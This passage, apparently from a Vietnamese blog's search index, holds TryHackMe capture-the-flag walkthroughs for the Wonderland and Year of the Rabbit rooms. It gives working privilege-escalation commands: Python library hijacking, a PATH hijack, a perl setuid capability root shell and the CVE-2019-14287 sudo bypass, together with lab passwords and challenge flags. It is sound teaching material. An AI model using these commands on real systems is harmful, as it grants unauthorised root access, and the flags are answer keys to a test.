http://10.10.176.200/r/a/b/b/i/t \u0111\u00fang v\u1edbi c\u00e1i hint ban \u0111\u1ea7u H\u00ecnh \u1ea3nh website C\u1ee9 t\u01b0\u1edfng l\u1ea1i c\u00f4ng c\u00f3c nh\u01b0 b\u1ea1n th\u1eed f12 trang web l\u00ean \u0111i, \u0111i\u1ec1u b\u1ea5t ng\u1edd s\u1ebd x\u1ea3y ra H\u00ecnh \u1ea3nh password Ta \u0111\u01b0\u1ee3c th\u00f4ng tin \u0111\u0103ng nh\u1eadp ssh (c\u00f3 l\u1ebb v\u1eady). Login ssh th\u00e0nh c\u00f4ng \u0110\u1eebng c\u00f3 xem username: alice password: HowDothTheLittleCrocodileImproveHisShiningTail","title":"Reconnaissance"},{"location":"tryhackme/room/wonderland/#init-access","text":"Terminal \u2514\u2500 $ ssh alice @10 . 10 . 176 . 200 The authenticity of host '10.10.176.200 (10.10.176.200)' can 't be established. ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:47: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ' 10 . 10 . 176 . 200 ' (ED25519) to the list of known hosts. alice@10.10.176.200' s password : Welcome to Ubuntu 18 . 04 . 4 LTS ( GNU / Linux 4 . 15 . 0 - 101-generic x86_64 ) * Documentation : https :// help . ubuntu . com * Management : https :// landscape . canonical . com * Support : https :// ubuntu . com / advantage System information as of Sat Aug 26 15 : 16 : 40 UTC 2023 System load : 0 . 1 Processes : 84 Usage of /: 18 . 9 % of 19 . 56GB Users logged in : 0 Memory usage : 15 % IP address for eth0 : 10 . 10 . 176 . 200 Swap usage : 0 % 0 packages can be updated . 0 updates are security updates . Last login : Mon May 25 16 : 37 : 21 2020 from 192 . 168 . 170 . 1 alice @wonderland :~$ V\u00e0o \u0111\u01b0\u1ee3c m\u00e1y ng\u01b0\u1eddi ta r\u1ed3i th\u00ec l\u00e0m g\u00ec ti\u1ebfp ta? Ta c\u00f3 2 h\u01b0\u1edbng c\u01a1 b\u1ea3n nh\u1ea5t c\u1ee7a vi\u1ec7c leo quy\u1ec1n l\u00e0 ki\u1ec3m tra sudo v\u00e0 suid (2 b\u01b0\u1edbc xem nh\u01b0 \u0111\u1ea7u ti\u00ean c\u1ea7n \u0111\u01b0\u1ee3c \u0111\u1ec3 \u00fd t\u1edbi) Hi\u1ec3n nhi\u00ean, ta ph\u1ea3i c\u00f3 th\u1ee7 t\u1ee5c cat /etc/shadow , cat /etc/crontab \u0111\u1ec3 l\u00e0m m\u00f3n khai v\u1ecb V\u1edbi sudo: Ta d\u00f9ng l\u1ec7nh sudo -l \u0111\u1ec3 ki\u1ec3m tra li\u1ec7u v\u1edbi user m\u00ecnh \u0111\u00e3 login th\u00ec s\u1ebd d\u00f9ng \u0111\u01b0\u1ee3c quy\u1ec1n n\u00e0o/d\u01b0\u1edbi t\u00ean ng\u01b0\u1eddi d\u00f9ng n\u00e0o (t\u00ednh c\u1ea3 leo thang \u0111\u1eb7c quy\u1ec1n theo chi\u1ec1u ngang). V\u1edbi suid: Ta d\u00f9ng l\u1ec7nh find / -user root -perm /4000 -type f 2>/dev/null \u0111\u1ec3 ki\u1ec3m tra suid \u0111\u01b0\u1ee3c ch\u1ea1y v\u1edbi root. Terminal alice @wonderland :~$ sudo -l [sudo] password for alice : Matching Defaults entries for alice on wonderland : env_reset , mail_badpass , secure_path =/ usr / local / sbin \\:/ usr / local / bin \\:/ usr / sbin \\:/ usr / bin \\:/ sbin \\:/ bin \\:/ snap / bin User alice may run the following commands on wonderland : ( rabbit ) / usr / bin / python3 . 6 / home / alice / walrus_and_the_carpenter . py Ta th\u1ea5y r\u1eb1ng khi ki\u1ec3m tra sudo th\u00ec v\u1edbi user Alice \u0111\u01b0a ra k\u1ebft qu\u1ea3 (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py t\u1ee9c l\u00e0 user Alice s\u1ebd \u0111\u01b0\u1ee3c d\u00f9ng python t\u1ea1i /usr/bin/python3.6 v\u1edbi quy\u1ec1n c\u1ee7a user rabbit (t\u00f4i d\u00f9ng t\u1eeb \"v\u1edbi quy\u1ec1n\" ch\u1ee9 kh\u00f4ng ph\u1ea3i l\u00e0 quy\u1ec1n t\u01b0\u01a1ng \u0111\u01b0\u01a1ng). Ch\u00fang ta xem th\u1eed file walrus_and_the_carpenter.py ch\u1ee9a g\u00ec trong \u0111\u00f3 walrus_and_the_carpenter.py alice @wonderland : ~ $ cat walrus_and_the_carpenter . py import random poem = \"\"\"The sun was shining on the sea, Shining with all his might: He did his very best to make The billows smooth and bright \u2014 And this was odd, because it was The middle of the night. . . . \"O Oysters,\" said the Carpenter. \"You\u2019ve had a pleasant run! Shall we be trotting home again?\" But answer came there none \u2014 And that was scarcely odd, because They\u2019d eaten every one.\"\"\" for i in range ( 10 ): line = random . choice ( poem . split ( \" \\n \" )) Th\u00ec c\u01a1 b\u1ea3n \u0111\u00e2y l\u00e0 m\u1ed9t \u0111o\u1ea1n ch\u01b0\u01a1ng tr\u00ecnh nh\u1eb1m in ra random d\u00f2ng th\u01a1 nh\u01b0ng c\u00e1i quan tr\u1ecdng ta focus v\u00e0o \u0111\u00e2y l\u00e0 ch\u01b0\u01a1ng tr\u00ecnh n\u00e0y d\u00f9ng dynamic linking (t\u1ee9c l\u00e0 d\u00f9ng th\u01b0 vi\u1ec7n \u0111\u1ed9ng) k\u1ebft n\u1ed1i. C\u1ee5 th\u1ec3 l\u00e0 th\u01b0 vi\u1ec7n random l\u1ea5y t\u1eeb 1 v\u1ecb tr\u00ed n\u00e0o \u0111\u00f3 trong m\u00e1y. Ki\u1ec3m tra v\u1ecb tr\u00ed b\u1eb1ng l\u1ec7nh: locate random.py Terminal alice @wonderland :/ home $ locate random . py / usr / lib / python3 / dist-packages / cloudinit / config / cc_seed_random . py / usr / lib / python3 . 6 / random . py Chuy\u1ec7n g\u00ec x\u1ea3y ra n\u1ebfu ta t\u1ea1o m\u1ed9t file random.py ngay t\u1ea1i folder ch\u1ee9a file walrus_and_the_carpenter.py ? N\u1ebfu ta l\u00e0m nh\u01b0 v\u1eady, khi ta th\u1ef1c thi file walrus_and_the_carpenter.py th\u00ec th\u01b0 vi\u1ec7n n\u00f3 \u0111\u01b0\u1ee3c import s\u1ebd ch\u00ednh l\u00e0 th\u01b0 vi\u1ec7n m\u00e0 ta \u0111\u00e3 t\u1ea1o (t\u1ee9c file random.py)","title":"Init Access"},{"location":"tryhackme/room/wonderland/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"tryhackme/room/wonderland/#python-library-hijacking","text":"\u1ede \u0111\u00e2y t\u00f4i \u0111\u1ec1 c\u1eadp \u0111\u1ebfn vi\u1ec7c dynamic-link library (DLL) v\u00e0 t\u1ea1o 1 library m\u1edbi \u0111\u1ec3 chuy\u1ec3n h\u01b0\u1edbng th\u01b0 vi\u1ec7n nh\u1eb1m \u0111\u1ea1t \u0111\u01b0\u1ee3c m\u1ee5c \u0111\u00edch t\u1ea5n c\u00f4ng ch\u1ee9 kh\u00f4ng \u0111i theo h\u01b0\u1edbng Hijacking v\u00e0o th\u01b0 vi\u1ec7n g\u1ed1c (b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y ph\u00e2n quy\u1ec1n c\u1ee7a file th\u01b0 vi\u1ec7n, \u0111\u00f3 l\u00e0 l\u00fd do) T\u1edbi \u0111\u00e2y, ta s\u1ebd t\u1ea1o 1 file random.py v\u1edbi m\u1ee5c \u0111\u00edch t\u1ea1o ra m\u1ed9t terminal. Th\u00ec theo logic, user rabbit t\u1ea1o terminal th\u00ec l\u00e0 terminal c\u1ee7a user rabbit random.py alice @wonderland : ~ $ cat random . py import pty pty . spawn ( \"/bin/bash\" ) T\u1ea1o sao l\u1ec7nh t\u1ea1o spawn kia l\u1ea1i trueyenf /bin/bash m\u00e0 kh\u00f4ng ph\u1ea3i /bin/sh, li\u1ec7u truy\u1ec1n /bin/sh th\u00ec chuy\u1ec7n g\u00ec s\u1ebd x\u1ea3y ra? Oke, b\u00e2y gi\u1edd th\u1ef1c thi file walrus_and_the_carpenter.py th\u00f4i sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py Terminal Ta \u0111\u00e3 v\u00e0o th\u00e0nh c\u00f4ng terminal c\u1ee7a user rabbit. Hi\u1ec3n nhi\u00ean l\u00e0 v\u00e0o b\u1eb1ng vi\u1ec7c leo quy\u1ec1n chi\u1ec1u ngang t\u1eeb user Alice n\u00ean ta kh\u00f4ng nh\u1eadn \u0111\u01b0\u1ee3c password \u0111\u00e2u v\u00e0 \u0111\u1ed3ng ngh\u0129a v\u1edbi vi\u1ec7c kh\u00f4ng th\u1ec3 th\u1ef1c hi\u1ec7n l\u1ec7nh sudo -l . Sau khi th\u0103m d\u00f2 h\u1ec7 th\u1ed1ng b\u1eb1ng user rabbit, ta l\u1ea1i ph\u00e1t hi\u1ec7n file teaParty trong /home/rabbit Terminal Ta th\u1eed strings teaParty th\u00ec th\u1ea5y h\u1ec7 th\u1ed1ng b\u00e1o command strings ch\u01b0a \u0111\u01b0\u1ee3c install, \u0111\u1ec3 h\u1ea1n ch\u1ebf vi\u1ec7c ph\u00e1t hi\u1ec7n c\u1ee7a blue team trong h\u1ec7 th\u1ed1ng, ta h\u1ea1n ch\u1ebf install package. M\u1ecdi h\u00e0nh vi m\u01a1 h\u1ed3 tr\u00ean h\u1ec7 th\u1ed1ng \u0111\u1ec1u \u0111\u1ec3 l\u1ea1i d\u1ea5u v\u1ebft. \u0110\u1ec3 d\u00f9ng \u0111\u01b0\u1ee3c strings ta c\u1ea7n install package binutils. Th\u00ec l\u00fac n\u00e0y ph\u00eda b\u00ean kia chi\u1ebfn tuy\u1ebfn c\u00f3 th\u1ec3 d\u00f9ng dpkg \u0111\u1ec3 xem th\u00f4ng tin g\u00f3i ho\u1eb7c c\u00f3 th\u1ec3 d\u00f9ng whereis , which \u0111\u1ec3 ki\u1ec3m tra v\u1ecb tr\u00ed l\u1ec7nh strings . T\u1eeb \u0111\u00e2y, ta s\u1ebd t\u1ea1o 1 m\u00e1y ch\u1ee7 web local \u0111\u1ec3 m\u00e1y attacker c\u00f3 th\u1ec3 l\u1ea5y file teaParty v\u1ec1 ki\u1ec3m th\u1eed H\u00ecnh \u1ea3nh wget file teaParty H\u00ecnh \u1ea3nh m\u1ed9t ph\u1ea7n n\u1ed9i dung file T\u1eeb h\u00ecnh tr\u00ean ta th\u1ea5y \u0111\u01b0\u1ee3c m\u00e3 Terminal Welcome to the tea party ! The Mad Hatter will be here soon . / bin / echo -n 'Probably by ' && date - -date = 'next hour' -R Ask very nicely , and I will give you some tea while you wait for him Segmentation fault ( core dumped ) \u0110o\u1ea1n m\u00e3 n\u00e0y nh\u1eadn bi\u1ebfn date \u0111\u1ec3 hi\u1ec3n th\u1ecb th\u00f4ng tin v\u1ec1 th\u1eddi gian, t\u1edbi \u0111\u00e2y m\u1ed9t \u00fd t\u01b0\u1eddng l\u00f3e l\u00ean trong \u0111\u1ea7u l\u00e0 fake bi\u1ebfn data n\u00e0y \u0111\u1ec3 khi\u1ebfn n\u00f3 hi\u1ec3n th\u1ecb c\u00e1i m\u00e0 ch\u00fang ta \u0111ang quan t\u00e2m. V\u1ea5n \u0111\u1ec1 \u1edf \u0111\u00e2y l\u00e0 g\u00ec? (\u0111\u1ecdc v\u00e0 suy ng\u1eabm...) H\u01a1i kh\u00f3 l\u00fd gi\u1ea3i m\u1ed9t x\u00edu, v\u1ec1 b\u1ea3n ch\u1ea5t \u1edf \u0111\u00e2y, c\u00e1c c\u00e2u l\u1ec7nh nh\u01b0: ls, cd, ... \u0111\u1ec1u l\u00e0 c\u00fa ph\u00e1p r\u00fat ng\u1eafn \u0111i. C\u1ee5 th\u1ec3 h\u01a1n c\u00e1c l\u1ec7nh \u0111\u00f3 b\u1ea3n ch\u1ea5t l\u00e0 1 \u0111\u01b0\u1eddng d\u1eabn t\u1edbi t\u1ec7p tin (t\u1ec7p tin ls , t\u1ec7p tin cd , ...) v\u00e0 c\u00f4ng d\u1ee5ng c\u1ee7a nh\u1eefng t\u1ec7p tin \u0111\u00f3 l\u00e0 output c\u1ee7a l\u1ec7nh m\u00e0 ch\u00fang ta \u0111\u00e3 tr\u1ea3i nghi\u1ec7m qua. N\u00f3i m\u1ed9t c\u00e1ch d\u1ec5 hi\u1ec3u h\u01a1n, \u1edf ph\u1ea7n leo thang \u0111\u1eb7c quy\u1ec1n theo chi\u1ec1u ngang ph\u00eda tr\u00ean, ch\u00ednh user Alice \u0111\u00e3 d\u00f9ng \u0111\u00fang t\u1ec7p tin python () \u0111\u1ec3 leo quy\u1ec1n user rabbit /usr/bin/python3.6 T\u00f3m l\u1ea1i, ta bi\u1ebft r\u1eb1ng trong file teaParty s\u1eed d\u1ee5ng bi\u1ebfn date , ta s\u1ebd t\u1ea1o file date nh\u01b0ng mang \u00fd ngh\u0129a m\u1edf shell \u0111\u1ec3 leo quy\u1ec1n, c\u1ee5 th\u1ec3 ta c\u00f3 th\u1ec3 d\u00f9ng l\u1ec7nh echo \"/bin/bash\" > date . Hi\u1ec3n nhi\u00ean b\u1ea1n ph\u1ea3i chuy\u1ec3n file \u0111\u00f3 v\u00e0o th\u01b0 m\u1ee5c b\u1ea1n c\u00f3 quy\u1ec1n ki\u1ec3m so\u00e1t, c\u1ee5 th\u1ec3 l\u00e0 th\u01b0 m\u1ee5c /tmp v\u00e0 c\u1ea5p quy\u1ec1n cho file (chmod 777). Ngo\u1ea1i tr\u1eeb th\u01b0 m\u1ee5c /tmp, li\u1ec7u c\u00f2n th\u01b0 m\u1ee5c n\u00e0o kh\u00e1c \u0111\u1ec3 ta d\u1eb7t l\u1ea1i bi\u1ebfn $PATH kh\u00f4ng? C\u00f3 th\u1ec3 d\u00f9ng th\u01b0 m\u1ee5c /home/rabbit \u0111\u1ec3 export $PATH thay cho /tmp Tr\u00ean \u0111\u00e2y l\u00e0 c\u00f4ng \u0111o\u1ea1n \u0111\u1ea7u ti\u00ean, \u0111i\u1ec1u g\u00ec s\u1ebd l\u00e0m ti\u1ebfn theo?","title":"Python Library Hijacking"},{"location":"tryhackme/room/wonderland/#path-variable","text":"Nh\u01b0 t\u00f4i \u0111\u00e3 \u0111\u1ec1 c\u1eadp, khi n\u00e0y ta c\u00f3 1 path t\u1edbi date l\u00e0 /tmp/date, nh\u01b0ng v\u1ea5n \u0111\u1ec1 bi\u1ebfn $PATH ch\u01b0a \u0111\u01b0\u1ee3c thay \u0111\u1ed5i. Ta s\u1ebd d\u00f9ng th\u1ee7 thu\u1eadt nh\u1ecf \u0111\u1ec3 thay \u0111\u1ed5i bi\u1ebfn $PATH echo $PATH # Xem $PATH m\u1eb7c \u0111\u1ecbnh export PATH=/tmp:$PATH # \u0111\u01b0a $PATH v\u00e0o tmp \u0111\u1ec3 d\u00f9ng \u0111\u01b0\u1ee3c date Xong, ti\u1ebfn h\u00e0nh ch\u1ea1y file teaParty Leo quy\u1ec1n th\u00e0nh c\u00f4ng Oke, ta v\u00e0o \u0111\u01b0\u1ee3c user hatter v\u00e0 l\u1ee5m \u0111\u01b0\u1ee3c file password.txt H\u00ecnh \u1ea3nh password password: WhyIsARavenLikeAWritingDesk? ::) Ph\u1ea3i c\u00f3 password m\u1edbi d\u00f9ng sudo -l \u0111\u01b0\u1ee3c ch\u1ee9 sudo -l Wao, th\u1eadt b\u1ea5t ng\u1edd :v T\u1edbi \u0111\u00e2y l\u00e0m g\u00ec n\u1eefa ???","title":"PATH Variable"},{"location":"tryhackme/room/wonderland/#capabilities","text":"Ch\u00fang ta l\u1ea1i qu\u00ean 1 ki\u1ec3m tra \u0111\u1eb7c quy\u1ec1n c\u01a1 b\u1ea3n khi v\u00e0o m\u00e1y n\u1ea1n nh\u00e2n \u0111\u00f3 l\u00e0 Capabilities h\u00ecnh \u1ea3nh Capabilities Ta th\u1ea5y t\u1ea1i perl c\u00f3 set_id :arrow: ta c\u00f3 th\u1ec3 leo quy\u1ec1n \u0111\u01b0\u1ee3c D\u00f9ng l\u1ec7nh trong https://gtfobins.github.io/gtfobins/perl/#capabilities perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' Ta s\u1ebd leo \u0111\u01b0\u1ee3c quy\u1ec1n root Terminal hatter @wonderland :~$ / usr / bin / perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' # whaomi / bin / sh : 1 : whaomi : not found # whoami root # ^C # exit hatter @wonderland :~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' # whoami root # cd /home/alice # cat root.txt thm { Twinkle , twinkle , little bat ! How I wonder what you \u2019 re at !} # find / -iname user.txt / root / user . txt # cat /root/user.txt thm { \"Curiouser and curiouser!\" } # Th\u1ef1c ra file user.txt th\u00ec nh\u00ecn hint \u1edf tryhackme ta s\u1ebd t\u00ecm \u0111\u01b0\u1ee3c \u1edf nh\u1eefng gi\u00e2y ph\u00fat ban \u0111\u1ea7u. Nh\u01b0ng hi\u1ec7n t\u1ea1i m\u00ecnh \u0111\u00e3 l\u00e0 root, vi\u1ec7c t\u00ecm file c\u0169ng ch\u01b0a mu\u1ed9n \u0111\u00fang kh\u00f4ng?","title":"Capabilities"},{"location":"tryhackme/room/wonderland/#what-we-learned","text":"Linux Privilege Escalation with Python Library Hijacking Linux Privilege Escalation with PATH Variable Linux Privilege Escalation with Capabilities 4*. abcd","title":"What we learned"},{"location":"tryhackme/room/yearoftherabbit/","tags":["THM-Room","Privilege Escalation","CVE-2019-14287"],"text":"Year of the Rabbit \u00b6 Room at https://tryhackme.com/room/yearoftherabbit List of the questions solved Question: What is the user flag? THM{1107174691af9ff3681d2b5bdb5740b1589bae53} Question: What is the root flag? THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161} Pentest scenario \u00b6 Host: 10.10.25.94 Reconnaissance \u00b6 \u0110\u1ea7u ti\u00ean, ta s\u1ebd scan port v\u00e0 directory c\u1ee7a website. Nmap scan NULL PORT STATE SERVICE 21 / tcp open | filtered ftp 22 / tcp open | filtered ssh 80 / tcp open | filtered http T\u1eeb scan port, ta th\u1ea5y website c\u00f3 m\u1edf port 21 v\u1edbi service ftp. M\u1ed9t tip nh\u1ecf \u0111\u1ec3 bi\u1ebft c\u00f3 login \u1ea9n danh \u0111\u01b0\u1ee3c hay kh\u00f4ng l\u00e0 d\u00f9ng curl \u0111\u1ec3 x\u1eed l\u00fd. Curl \u2514\u2500 $ curl ftp :// 10 . 10 . 25 . 94 -v * Trying 10 . 10 . 25 . 94 : 21 ... * Connected to 10 . 10 . 25 . 94 ( 10 . 10 . 25 . 94 ) port 21 ( #0) < 220 ( vsFTPd 3 . 0 . 2 ) > USER anonymous < 331 Please specify the password . > PASS ftp @example . com < 530 Login incorrect . * Access denied : 530 * Closing connection 0 curl : ( 67 ) Access denied : 530 T\u1eeb k\u1ebft qu\u1ea3 c\u1ee7a curl, ta th\u1ea5y kh\u00f4ng login \u0111\u01b0\u1ee3c v\u1edbi user \u1ea9n danh. Ti\u1ebfp t\u1ee5c scan dir b\u1eb1ng gobuster, ta th\u1ea5y website c\u00f3 trang http://10.10.25.94/assets/ . V\u1edbi file RickRolled th\u00ec ch\u00fang ta hi\u1ec3u n\u00f3 l\u00e0 g\u00ec r\u1ed3i ::). V\u00e0 file style.css ta th\u1ea5y m\u1ed9t hint kh\u00e1 h\u1eefu \u00edch v\u1ec1 trang web \u1ea9n ../sup3r_s3cr3t_fl4g.php Style.css V\u00e0o website th\u00ec ta ph\u00e1t hi\u1ec7n n\u00f3 ch\u1eb7n js M\u1ed9t tip nh\u1ecf n\u1eefa, ta c\u0169ng s\u1ebd d\u00f9ng curl \u0111\u1ec3 xem x\u00e9t g\u00f3i tin, thay v\u00ec t\u1eaft js. (B\u1ea1n \u0111\u1ecdc th\u00ec n\u00ean t\u1eaft js xem website n\u00f3 th\u1ec3 hi\u1ec7n g\u00ec nhen :3) Curl \u2514\u2500 $ curl http :// 10 . 10 . 25 . 94 / sup3r_s3cr3t_fl4g . php -v * Trying 10 . 10 . 25 . 94 : 80 ... * Connected to 10 . 10 . 25 . 94 ( 10 . 10 . 25 . 94 ) port 80 ( #0) > GET / sup3r_s3cr3t_fl4g . php HTTP / 1 . 1 > Host : 10 . 10 . 25 . 94 > User-Agent : curl / 7 . 88 . 1 > Accept : */* > < HTTP / 1 . 1 302 Found < Date : Fri , 01 Sep 2023 16 : 31 : 02 GMT < Server : Apache / 2 . 4 . 10 ( Debian ) < Location : intermediary . php ? hidden_directory =/ WExYY2Cv-qU < Content-Length : 0 < Content-Type : text / html ; charset = UTF - 8 < * Connection #0 to host 10.10.25.94 left intact Ta th\u1ea5y n\u00f3 c\u00f3 1 folder \u1ea9n l\u00e0 WExYY2Cv-qU . C\u1ee9 curl ti\u1ebfp Curl \u2514\u2500 $ curl http :// 10 . 10 . 25 . 94 / WExYY2Cv-qU / -v * Trying 10 . 10 . 25 . 94 : 80 ... * Connected to 10 . 10 . 25 . 94 ( 10 . 10 . 25 . 94 ) port 80 ( #0) > GET / WExYY2Cv-qU / HTTP / 1 . 1 > Host : 10 . 10 . 25 . 94 > User-Agent : curl / 7 . 88 . 1 > Accept : */* > < HTTP / 1 . 1 200 OK < Date : Fri , 01 Sep 2023 16 : 34 : 27 GMT < Server : Apache / 2 . 4 . 10 ( Debian ) < Vary : Accept-Encoding < Content-Length : 954 < Content-Type : text / html ; charset = UTF - 8 < <! DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\" > < html > < head > < title > Index of / WExYY2Cv-qU </ title > </ head > < body > < h1 > Index of / WExYY2Cv-qU </ h1 > < table > < tr >< th valign = \"top\" >< img src = \"/icons/blank.gif\" alt = \"[ICO]\" ></ th >< th >< a href = \"?C=N;O=D\" > Name </ a ></ th >< th >< a href = \"?C=M;O=A\" > Last modified </ a ></ th >< th >< a href = \"?C=S;O=A\" > Size </ a ></ th >< th >< a href = \"?C=D;O=A\" > Description </ a ></ th ></ tr > < tr >< th colspan = \"5\" >< hr ></ th ></ tr > < tr >< td valign = \"top\" >< img src = \"/icons/back.gif\" alt = \"[PARENTDIR]\" ></ td >< td >< a href = \"/\" > Parent Directory </ a ></ td >< td >& nbsp ;</ td >< td align = \"right\" > - </ td >< td >& nbsp ;</ td ></ tr > < tr >< td valign = \"top\" >< img src = \"/icons/image2.gif\" alt = \"[IMG]\" ></ td >< td >< a href = \"Hot_Babe.png\" > Hot_Babe . png </ a ></ td >< td align = \"right\" > 2020 - 01 - 23 00 : 34 </ td >< td align = \"right\" > 464K </ td >< td >& nbsp ;</ td ></ tr > < tr >< th colspan = \"5\" >< hr ></ th ></ tr > </ table > < address > Apache / 2 . 4 . 10 ( Debian ) Server at 10 . 10 . 25 . 94 Port 80 </ address > </ body ></ html > * Connection #0 to host 10.10.25.94 left intact Ta nh\u1eadn \u0111\u01b0\u1ee3c file Hot_Babe.png . \u0110\u01b0\u1ee3c r\u1ed3i ta s\u1ebd get file v\u1ec1. V\u1edbi strings, ta th\u1ea5y r\u1eb1ng \u0111o\u1ea1n sau c\u1ee7a file \u1ea3nh hi\u1ec3n th\u1ecb th\u00f4ng tin username v\u00e0 password cho vi\u1ec7c login b\u1eb1ng ftp Ta s\u1ebd d\u00f9ng hydra \u0111\u1ec3 brute force password No.... user: ftpuser pass: 5iez1wGXKfPKQ Login ftp th\u00f4i, ta s\u1ebd \u0111\u01b0\u1ee3c th\u00eam 1 \u0111o\u1ea1n text m\u1edbi +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->- --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ ++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+ +++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++< ]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+ ++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->--- --<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++ +<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+ ++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++ <]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++ <]>+. <+++[ ->--- <]>-- ---.- ----. < \u0110\u00e2y l\u00e0 th\u00f4ng \u0111i\u1ec7p \u0111\u01b0\u1ee3c m\u00e3 h\u00f3a b\u1eb1ng Brainfuck. D\u00f9ng c\u00e1c website decode tr\u00ean m\u1ea1ng ta \u0111\u01b0\u1ee3c th\u00f4ng tin login ssh User: eli Password: DSpDiM1wAEwid Init Access \u00b6 Sau khi login ssh ta th\u1ea5y \u0111\u01b0\u1ee3c hint c\u0169ng kh\u00e1 c\u00f3 \u00fd ngh\u0129a Hint Hint n\u00f3i r\u1eb1ng c\u00f3 m\u1ed9t file s3cr3t n\u00e0o \u0111\u00f3, t\u00ecm th\u00f4ng tin file b\u1eb1ng find Your password is awful , Gwendoline . It should be at least 60 characters long ! Not just MniVCQVhQHUNI Honestly ! Yours sincerely -Root password for user gwendoline is MniVCQVhQHUNI Ti\u1ebfp t\u1ee5c login v\u1edbi user gwendoline... Sudo -l gwendoline @year -of-the-rabbit :~$ sudo -l Matching Defaults entries for gwendoline on year-of-the-rabbit : env_reset , mail_badpass , secure_path =/ usr / local / sbin \\:/ usr / local / bin \\:/ usr / sbin \\:/ usr / bin \\:/ sbin \\:/ bin User gwendoline may run the following commands on year-of-the-rabbit : ( ALL , ! root ) NOPASSWD : / usr / bin / vi / home / gwendoline / user . txt Searchsploit ta th\u1ea5y k\u1ebft qu\u1ea3 \u0111\u00e2y l\u00e0 CVE-2019-14287 Privilege Escalation \u00b6 D\u1ef1a v\u00e0 m\u00f4 t\u1ea3 c\u1ee7a CVE-2019-14287 nh\u01b0 tr\u00ean, ta d\u1ec5 d\u00e0ng leo quy\u1ec1n root sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt :!/bin/sh What we learned \u00b6 Disable Javascript Brainfuck CVE-2019-14287","title":"Year of the Rabbit"},{"location":"tryhackme/room/yearoftherabbit/#year-of-the-rabbit","text":"Room at https://tryhackme.com/room/yearoftherabbit List of the questions solved Question: What is the user flag? THM{1107174691af9ff3681d2b5bdb5740b1589bae53} Question: What is the root flag? THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}","title":"Year of the Rabbit"},{"location":"tryhackme/room/yearoftherabbit/#pentest-scenario","text":"Host: 10.10.25.94","title":"Pentest scenario"},{"location":"tryhackme/room/yearoftherabbit/#reconnaissance","text":"\u0110\u1ea7u ti\u00ean, ta s\u1ebd scan port v\u00e0 directory c\u1ee7a website. Nmap scan NULL PORT STATE SERVICE 21 / tcp open | filtered ftp 22 / tcp open | filtered ssh 80 / tcp open | filtered http T\u1eeb scan port, ta th\u1ea5y website c\u00f3 m\u1edf port 21 v\u1edbi service ftp. M\u1ed9t tip nh\u1ecf \u0111\u1ec3 bi\u1ebft c\u00f3 login \u1ea9n danh \u0111\u01b0\u1ee3c hay kh\u00f4ng l\u00e0 d\u00f9ng curl \u0111\u1ec3 x\u1eed l\u00fd. Curl \u2514\u2500 $ curl ftp :// 10 . 10 . 25 . 94 -v * Trying 10 . 10 . 25 . 94 : 21 ... * Connected to 10 . 10 . 25 . 94 ( 10 . 10 . 25 . 94 ) port 21 ( #0) < 220 ( vsFTPd 3 . 0 . 2 ) > USER anonymous < 331 Please specify the password . > PASS ftp @example . com < 530 Login incorrect . * Access denied : 530 * Closing connection 0 curl : ( 67 ) Access denied : 530 T\u1eeb k\u1ebft qu\u1ea3 c\u1ee7a curl, ta th\u1ea5y kh\u00f4ng login \u0111\u01b0\u1ee3c v\u1edbi user \u1ea9n danh. Ti\u1ebfp t\u1ee5c scan dir b\u1eb1ng gobuster, ta th\u1ea5y website c\u00f3 trang http://10.10.25.94/assets/ . V\u1edbi file RickRolled th\u00ec ch\u00fang ta hi\u1ec3u n\u00f3 l\u00e0 g\u00ec r\u1ed3i ::). V\u00e0 file style.css ta th\u1ea5y m\u1ed9t hint kh\u00e1 h\u1eefu \u00edch v\u1ec1 trang web \u1ea9n ../sup3r_s3cr3t_fl4g.php Style.css V\u00e0o website th\u00ec ta ph\u00e1t hi\u1ec7n n\u00f3 ch\u1eb7n js M\u1ed9t tip nh\u1ecf n\u1eefa, ta c\u0169ng s\u1ebd d\u00f9ng curl \u0111\u1ec3 xem x\u00e9t g\u00f3i tin, thay v\u00ec t\u1eaft js. (B\u1ea1n \u0111\u1ecdc th\u00ec n\u00ean t\u1eaft js xem website n\u00f3 th\u1ec3 hi\u1ec7n g\u00ec nhen :3) Curl \u2514\u2500 $ curl http :// 10 . 10 . 25 . 94 / sup3r_s3cr3t_fl4g . php -v * Trying 10 . 10 . 25 . 94 : 80 ... * Connected to 10 . 10 . 25 . 94 ( 10 . 10 . 25 . 94 ) port 80 ( #0) > GET / sup3r_s3cr3t_fl4g . php HTTP / 1 . 1 > Host : 10 . 10 . 25 . 94 > User-Agent : curl / 7 . 88 . 1 > Accept : */* > < HTTP / 1 . 1 302 Found < Date : Fri , 01 Sep 2023 16 : 31 : 02 GMT < Server : Apache / 2 . 4 . 10 ( Debian ) < Location : 